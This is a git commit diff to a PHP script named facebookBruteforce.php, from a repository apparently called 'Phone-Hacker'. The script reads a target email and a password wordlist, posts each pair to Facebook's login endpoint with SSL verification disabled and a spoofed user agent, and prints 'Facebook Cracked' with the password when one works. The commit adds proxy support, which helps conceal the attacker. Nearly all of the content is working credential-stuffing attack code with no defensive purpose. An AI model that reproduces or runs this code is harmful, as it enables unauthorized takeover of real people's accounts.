24e158cfa8695b0639e74b64bbca57460b09eb72
R5fs <RafaelRfs@users.noreply.github.com>
2017-09-16 12:57:17 -0300

    Update facebookBruteforce.php

--- Phone-Hacker/facebookBruteforce.php
+++ Phone-Hacker/facebookBruteforce.php
@@ -1,16 +1,18 @@
 <?php 
+$proxy = '';
 $email =isset($_GET['email'])? $_GET['email'] : '' ;
 $wordlist = isset($_GET['words'])? $_GET['words'] : 'pass.txt';
 echo '[+] Uso: facebookBruteforce.php?email=email@email.com<br/>';
 echo '[+] Uso: senhas no arquivo pass.txt ou no $_GET words:<br/>';
 echo '[+][+][+] facebookBruteforce.php?email=email@email.com&words=wordlist.txt<br/>';
-function brute($usuario, $senha){
+function brute($usuario, $senha,$proxy){
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
       curl_setopt($ch, CURLOPT_HEADER, false);
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+      if(trim($proxy) <> '') curl_setopt($ch, CURLOPT_PROXY,$proxy);
       curl_setopt($ch, CURLOPT_POST, true);
       curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
       curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
@@ -30,7 +32,7 @@ function brute($usuario, $senha){
 			$line = str_replace("\r","",$line);
 			$line = str_replace("\n","",$line);
 		
-		if(brute($email, $line)){
+		if(brute($email, $line,$proxy)){
           print "<br/>-----------------------------------------------------------------------\n\n";
           echo "<br/>[+] Facebook Cracked -> " . "Email: " . $email . " Senha: " .$line .   "\n\n";
           print "<br/>-------------------------------------------------------------------------\n";
